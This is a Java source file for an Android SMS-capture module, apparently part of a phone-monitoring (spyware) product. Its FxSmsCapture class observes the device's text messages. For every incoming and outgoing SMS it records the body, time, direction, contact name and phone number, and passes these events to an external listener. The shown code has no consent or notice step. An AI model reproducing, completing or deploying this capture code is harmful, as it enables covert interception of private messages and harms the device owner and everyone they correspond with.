package com.vvt.processsms;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxRecipient;
import com.vvt.events.FxRecipientType;
import com.vvt.events.FxSMSEvent;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;
import com.vvt.sms.SmsData;
import com.vvt.sms.SmsObserver;
import com.vvt.telephony.TelephonyUtils;

public class FxSmsCapture implements SmsObserver.OnCaptureListener {
	
	private static final String TAG = "SmsCapturer";
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private FxEventListener mFxEventListner;
	private Context mContext;
	private String mWritablepath;
	private SmsObserver mSmsObserver;
	private boolean mIsWorking;
	
	public FxSmsCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
		
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException(
					"Capturing is working, please call stopCapture before unregister.");
		}
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException{
		if(LOGV) FxLog.v(TAG, "startCapture # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
		
			mSmsObserver = SmsObserver.getInstance(mContext);
			mSmsObserver.setLoggablePath(mWritablepath);
			//TODO : no need because we deliver time in long type not String.
			mSmsObserver.setDateFormat(DATE_FORMAT);
			mSmsObserver.registerObserver(this);
		}
		if(LOGV) FxLog.v(TAG, "startCapture # EXIT ...");
	}
	
	public void stopCapture() {
		if(mSmsObserver != null) {
			mSmsObserver.unregisterObserver(this);
			mIsWorking = false;
		}
	}

	@Override
	public void onCapture(ArrayList<SmsData> smses) {
		
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		 FxSMSEvent smsEvent = null;
		
		for (SmsData sms : smses) {
			
			FxEventDirection direction = FxEventDirection.UNKNOWN;
			direction = sms.isIncoming() ? FxEventDirection.IN : FxEventDirection.OUT;
			
			String phoneNumber = 
					TelephonyUtils.formatCapturedPhoneNumber(
							sms.getPhonenumber());
			
			String contactName = sms.getContactName();
			
			if (contactName == null || contactName.trim().length() < 1) {
				contactName = "unknown";
			}
			
			smsEvent = new FxSMSEvent();
			smsEvent.setDirection(direction);
			smsEvent.setEventTime(sms.getTime());
			smsEvent.setSMSData(sms.getData());
			smsEvent.setContactName(contactName);
			
			FxRecipient r = new FxRecipient();
			if (direction == FxEventDirection.OUT) {
				r.setContactName(contactName);
				r.setRecipientType(FxRecipientType.TO);
				r.setRecipient(phoneNumber);
				smsEvent.addRecipient(r);
			} else {
				smsEvent.setSenderNumber(phoneNumber);
			}
			events.add(smsEvent);
		}
		
		if(events.size() > 0) {
			this.mFxEventListner.onEventCaptured(events); 
		}
	}
	
}
